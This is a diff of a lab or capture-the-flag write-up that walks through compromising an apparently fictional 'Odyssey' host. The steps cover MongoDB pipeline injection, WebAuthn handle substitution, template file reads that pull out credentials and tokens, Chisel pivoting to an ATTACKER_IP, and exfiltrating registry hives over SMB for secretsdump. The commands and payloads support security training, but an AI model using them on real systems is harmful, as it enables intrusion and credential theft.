@@ -20,8 +20,6 @@ The database host's machine account can write `msDS-KeyCredentialLink` on `svc-a
 | Active Directory | `ODYSSEY-DB$` → `svc-aegis-build` → `svc-aegis-deploy` |
 | AegisStream | Viewer → operator → stream service → SYSTEM and `root.txt` |
 
-Both flag values are intentionally omitted.
-
 ## Reproduction setup
 
 The recorded instance used these addresses:
@@ -36,7 +34,7 @@ The recorded instance used these addresses:
 
 The public target and attacker VPN address can change after a reset or VPN reconnect. Run all local commands from the `Odyssey` directory in this repository. The helper scripts save their output under `responses/` and `scans/`; generated binaries and recovered secrets are ignored by Git.
 
-Kali implements PEP 668, so install the two Python dependencies in a virtual environment rather than into the system Python installation:
+If you are on Kali, Kali implements PEP 668, so install the two Python dependencies in a virtual environment rather than into the system Python installation:
 
 ```bash
 python3 -m venv .venv
@@ -65,7 +63,7 @@ Additional tools and runtime variables are listed in [REPRODUCTION.md](REPRODUCT
 
 ### 1.1 TCP scan and service identification
 
-I began with a full TCP SYN scan so that the investigation was not biased toward common web ports:
+A full TCP SYN scan avoids biasing the investigation toward common web ports:
 
 ```bash
 nmap -sS -Pn -n -p- -T4 \
@@ -92,7 +90,7 @@ nmap -sV -sC -Pn -n -p3000 --reason \
 3000/tcp open  http  Node.js Express framework
 ```
 
-### 1.2 Why WebAuthn and the MDS API became leads
+### 1.2 WebAuthn and the MDS API
 
 The unauthenticated login page loaded two readable JavaScript files. Searching them showed both a username-less WebAuthn ceremony and an MDS compatibility ticker:
 
@@ -133,7 +131,7 @@ An empty `allowCredentials` list is consistent with username-less authentication
 
 ### 2.1 Proving that `pipeline` is executed
 
-The MDS request accepted a JSON value in the `pipeline` query parameter. One response is not enough to distinguish a real injection from an ignored parameter, so I used four controls:
+The MDS request accepted a JSON value in the `pipeline` query parameter. One response is not enough to distinguish a real injection from an ignored parameter, so four controls were used:
 
 - An empty pipeline establishes the baseline.
 - A known vendor filter should reduce the result set.
@@ -175,7 +173,7 @@ This distinction matters: the issue was not merely control of filtering and limi
 
 The accepted `$project` stage also allowed `$function`, which executes JavaScript inside MongoDB's embedded engine. This is MongoDB JavaScript, not Node.js; Node globals such as `require` and `process` are not normally present.
 
-I first queried the runtime and then tested the module loader against a harmless known file:
+The runtime was queried first, followed by a module-loader test against a harmless known file:
 
 ```bash
 ./scripts/probe-mds-buildinfo.sh
@@ -315,7 +313,7 @@ jq '.[0].invites[0].rows | map({operator_id, redeemed, expires_at})' \
   responses/pending-invites.body
 ```
 
-Because `curl -o` writes the body to a file, a blank terminal was expected in the older command. The added `-w` line makes the HTTP status and response size visible.
+`curl -o` saves the response body to `responses/pending-invites.body`, while `-w` prints the HTTP status and response size in the terminal.
 
 Select the first currently unused token rather than relying on collection order:
 
@@ -330,7 +328,7 @@ jq -r '
 test -s responses/invite-token.txt
 ```
 
-### 4.2 Why a valid credential could become `admin`
+### 4.2 WebAuthn `userHandle` substitution
 
 The registration handler required a discoverable credential and stored its credential ID, public key, and original user handle. The authentication handler correctly looked up the credential by ID and verified the signed assertion against its stored public key. After verification, however, it selected the application user from the independently supplied `response.userHandle` instead of the handle bound to the stored credential.
 
@@ -384,9 +382,26 @@ AEGIS-LEAK:odyssey-web
 AEGIS-HIT:/etc/aegis-render.env
 ```
 
+The environment lines are stored in the saved rendering response. Extract the database settings with:
+
+```bash
+jq -r '.stages[] | .stderr // empty' \
+  responses/template-render-render-env.body |
+  sed -n 's/^FILELINE:[0-9][0-9]*:\(AEGIS_RENDER_DB_[A-Z_]*=[^[:space:]]*\).*/\1/p' |
+  awk '!seen[$0]++'
+```
+
+```text
+AEGIS_RENDER_DB_USER=aegis_audit_publisher
+AEGIS_RENDER_DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
+AEGIS_RENDER_DB_HOST=172.16.0.11
+AEGIS_RENDER_DB_DB=aegis_audit
+AEGIS_RENDER_DB_PORT=1433
+```
+
 The non-zero `pdflatex` code is expected for these diagnostic payloads. The file lines had already been written to the log before the final PDF build failed. This primitive reads files available to `aegis-render`; it is not yet command execution as `webadmin`.
 
-The renderer environment disclosed a separate audit-database connection:
+The renderer environment therefore disclosed a separate audit-database connection:
 
 ```text
 server=172.16.0.11
@@ -397,7 +412,7 @@ password=Rxd!Qw6n8sP..2bJ@Wpx-2026
 
 ## 6. Diagnostic JSONPath to `webadmin`
 
-The renderer read showed that configuration lived under `/etc`, so I used the same primitive to inspect the MDS diagnostic environment, its route source, and the installed JSONPath package metadata:
+The renderer read showed that configuration lived under `/etc`, so the same primitive was used to inspect the MDS diagnostic environment, its route source, and the installed JSONPath package metadata:
 
 ```bash
 ./scripts/render-template-probe.sh mds-diag-env \
@@ -411,6 +426,27 @@ The renderer read showed that configuration lived under `/etc`, so I used the sa
 ./scripts/render-template-probe.sh jsonpath-package \
   @artifacts/prototype-read-jsonpath-package.md \
   '{"__proto__":{"allowRawBlocks":true}}'
+```
+
+Each helper invocation saves its complete response under `responses/`. Extract the token, registered route, and package version with:
+
+```bash
+jq -r '.stages[] | .stderr // empty' \
+  responses/template-render-mds-diag-env.body |
+  sed -n 's/^FILELINE:[0-9][0-9]*:\(MDS_DIAG_TOKEN=[^[:space:]]*\).*/\1/p' |
+  head -n 1
+
+jq -r '.stages[] | .stderr // empty' \
+  responses/template-render-mds-diag-source-v2.body |
+  sed -n 's/^SOURCE:[0-9][0-9]*:\(.*\/api\/v1\/aegis-mds\/_diag.*\)[[:space:]]*$/\1/p' |
+  head -n 1 |
+  sed 's/[[:space:]]*$//'
+
+jq -r '.stages[] | .stderr // empty' \
+  responses/template-render-jsonpath-package.body |
+  sed -n 's/^FILELINE:[0-9][0-9]*:\({.*}\)[[:space:]]*$/\1/p' |
+  head -n 1 |
+  jq -r '"\(.name)=\(.version)"'
 ```
 
 ```text
@@ -452,12 +488,6 @@ Shell variables are not shared between terminals. Run the following in each new 
 ```bash
 export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
 test -n "$ATTACKER_IP"
-```
-
-First verify that the required ports are not already owned by an earlier run. If they are, either reuse the existing process or stop it before starting a duplicate:
-
-```bash
-ss -ltnp '( sport = :8000 or sport = :8001 or sport = :1080 )'
 ```
 
 In attacker terminal 1, serve the compatible Chisel binary:
@@ -529,7 +559,7 @@ aegis_audit_publisher
 
 ### 8.1 Enumerating the audit login
 
-`mssql-audit.sh` connects through ProxyChains. It extracts the credential from the saved renderer response or accepts the `AEGIS_RENDER_DB_*` variables documented in [REPRODUCTION.md](REPRODUCTION.md):
+`mssql-audit.sh` connects through ProxyChains. It extracts the credential from the saved renderer response or accepts the `AEGIS_RENDER_DB_*` variables documented in [REPRODUCTION.md](REPRODUCTION.md). The wrapper uses `scripts/impacket-example.sh` so Kali's system Impacket continues to work while `.venv` is active.
 
 ```bash
 ./scripts/mssql-audit.sh \
@@ -714,7 +744,7 @@ SYSTEM can save the protected `SYSTEM`, `SECURITY`, and `SAM` registry hives. Th
 Stop Responder before starting the SMB server because both need TCP/445. Then start an authenticated temporary share from the repository root:
 
 ```bash
-impacket-smbserver -smb2support \
+./scripts/impacket-example.sh smbserver -smb2support \
   -username exfil \
   -password 'Exfil-2026-Temp!' \
   share "$PWD/smb-share"
@@ -738,7 +768,7 @@ Run the export:
 Process the downloaded hives locally:
 
 ```bash
-impacket-secretsdump \
+./scripts/impacket-example.sh secretsdump \
   -system smb-share/od_sys.hiv \
   -security smb-share/od_sec.hiv \
   -sam smb-share/od_sam.hiv LOCAL |
@@ -871,7 +901,7 @@ WinRM accepted `ODYSSEY\svc-aegis-deploy`. NetExec's `Pwn3d!` label did not prov
 
 ### 10.1 Finding the viewer boundary
 
-Because the deploy account belonged to `AegisStream-Viewers`, I enumerated the product directory and ACLs instead of assuming generic Windows administrator rights:
+Because the deploy account belonged to `AegisStream-Viewers`, the product directory and ACLs were enumerated instead of assuming generic Windows administrator rights:
 
 ```bash
 ./scripts/domain-deploy.sh winrm 172.16.0.10 -x \
